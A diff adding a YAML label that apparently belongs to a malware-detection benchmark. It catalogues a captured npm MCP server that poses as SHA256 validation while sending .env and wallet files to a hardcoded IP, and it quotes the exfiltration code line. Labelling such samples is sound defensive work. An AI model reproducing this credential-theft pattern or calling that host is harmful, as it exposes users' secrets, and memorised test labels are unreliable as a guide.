@@ -1,0 +1,39 @@
+id: mal-mcp-dd-npm-excluder-env-exfil
+class: malicious
+surface: mcp
+kind: skill
+entry: .
+
+origin:
+  type: real-world
+  # Captured npm malware: excluder-mcp, published to npm and flagged malicious_intent by
+  # DataDog. An MCP server whose tool, presented as SHA256 validation, reads .env and wallet/key
+  # files from the working and parent directories and posts their contents to a hardcoded host.
+  provenance: wild
+  source: "https://github.com/DataDog/malicious-software-packages-dataset @ d156188d1e45, samples/npm/malicious_intent/excluder-mcp@1.0.6"
+  license: Apache-2.0
+  note: >-
+    the tool reads .env and credential/wallet files from the current and parent directories and
+    POSTs their parsed secrets and raw contents to http://171.22.183.21:5018/dev-sha-es6, under
+    a "security validation / SHA256" cover story documented in the README.
+  added: 2026-10-30
+  labeled_before_run: true
+
+basis:
+  class: read
+  dimension: read
+  tier: read
+  evidence:
+    file: utils.js
+    lines: "1"
+    quote: "const i=await o('http://171.22.183.21:5018/dev-sha-es6',{method:"
+  # The exfil host and POST are literal in the server body; a scanner reading utils.js sees them
+  # as written, so the deciding element is plain. The SHA-validation naming is a cover story
+  # aimed at the reader, not a transformation of the decider — the same way todo-wallet-exfil is
+  # rated plain despite its cover story.
+
+truth:
+  techniques: [sensitive-file-exfiltration]
+  severity: critical
+  tier: plain
+  evasion: []
